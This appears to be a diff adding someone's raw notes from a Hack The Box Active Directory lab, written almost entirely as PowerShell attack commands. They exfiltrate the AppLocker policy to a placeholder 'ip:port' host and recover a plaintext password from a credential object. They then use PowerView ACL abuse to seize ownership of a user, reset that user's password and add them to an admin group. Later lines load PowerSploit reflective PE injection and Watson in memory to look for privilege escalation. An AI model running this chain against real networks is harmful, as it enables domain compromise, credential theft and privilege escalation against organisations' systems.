@@ -1,0 +1,52 @@
+Get-ApplockerPolicy -Effective -xml
+$output = Get-ApplockerPolicy -Effective -xml
+Invoke-RestMethod -Method PUT -Url http://ip:port/applocker.xml -Body $output
+-->
+
+Get-Service | where  {$_.status -eq 'Running'}
+
+$pass = 'adfasdfsdafdsaf' | converto-securestring
+$user = 'htb\tom'
+$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
+
+$cred.GetNetworkCredential() | fl *
+
+net groups /domain
+
+load the powerView.ps1
+Set-DomainObjectOwner -Identity Herman -OwenerIdentity nico
+Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
+$pass = Converto-SecureString  'password' -asPlainText -Force
+set-DomainUserPassword Herman -AccountPassword $pass -Verbose
+
+google powershell get members group
+Get-DomainGroup -MemberIdentity Herman |select samaccountname
+
+$cred = New-Object System.Management.Automation.PSCredential('htb\herman', $pass)
+Add-DomainGroupMember -Identity 'Back_Admins' -Members Herman -Credential $cred
+
+Get-DomainGroup -MemberIdentity Herman |select samaccountname
+
+
+watson
+$file = Get-Item crl.dll
+[System.Diagnostics.FileVersionInfo]::GetVersionInfo($file).FileVersion
+
+use powershell execute waston
+
+grep -Ri Invoke-ReflectionPEInjection /opt/PowerSploit-dev/
+
+IEX(pe.ps1)
+$PEBytes = [IO.File]::ReadAllBytes('c:\users\nico\waston') #full path
+Invoke-ReflectivePEInjection -PEBytes $PEBytes
+
+complie waston to dll
+change console application to console libary
+
+[Reflection.ASsembly]::LoadFile("c:\users\nico\Watson.dll")
+[Watson.Program]::Main()
+
+
+OneLogicalMath zeroday powershell
+
+
